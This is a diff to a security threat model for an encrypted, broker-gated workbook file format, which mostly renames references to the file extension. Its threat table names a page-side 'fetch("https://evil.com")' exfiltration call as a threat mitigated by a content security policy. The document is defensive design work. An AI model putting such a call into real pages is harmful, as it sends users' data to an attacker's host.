@@ -47,7 +47,7 @@ Pattern A1 plus can MITM in principle. Defended against by TLS + webpki-roots.
 
 ### A3 — Holder of a sealed file but not in policy
 
-Has the bytes of a `.workbook.html` envelope, no broker-allowed identity. Can read public meta tags (workbook id, broker URL, policy hash). Cannot decrypt without a DEK release.
+Has the bytes of a sealed workbook envelope, no broker-allowed identity. Can read public meta tags (workbook id, broker URL, policy hash). Cannot decrypt without a DEK release.
 
 ### A4 — Authenticated-but-not-allowed identity
 
@@ -102,7 +102,7 @@ Email server, S3/R2, USB courier. Channel sees ciphertext bytes. Without a lease
                               └──────────┬──────────┘                  │
                                          │                             │
                                          ▼                             │
-                              ┌─────────────────────┐  artifact (.workbook.html)
+                              ┌─────────────────────┐  artifact (.html)
                               │   WorkOS / AuthKit  │  ────distributed out-of-band────
                               │   (identity proof)  │
                               └──────────┬──────────┘
@@ -165,7 +165,7 @@ These are inherited from `SECURITY_MODEL.md` and apply to the recipient daemon's
 
 | # | Threat | Mitigation | Status |
 |---|---|---|---|
-| S1 | Sharing a `.workbook.html` leaks secrets | Keys never in file; OS keychain. | ✅ |
+| S1 | Sharing a workbook leaks secrets | Keys never in file; OS keychain. | ✅ |
 | S2 | Malicious workbook reads another workbook's secrets on same daemon | Keychain entries namespaced by canonical-path-hash + `workbook_id`. | ✅ |
 | S3 | Page-side `fetch("https://evil.com")` exfiltration | CSP `connect-src 'self'` + page-side fetch wrapper. | ✅ |
 | S4 | Daemon as open relay for outbound proxy | Per-secret host allowlist from spec script. | ✅ |
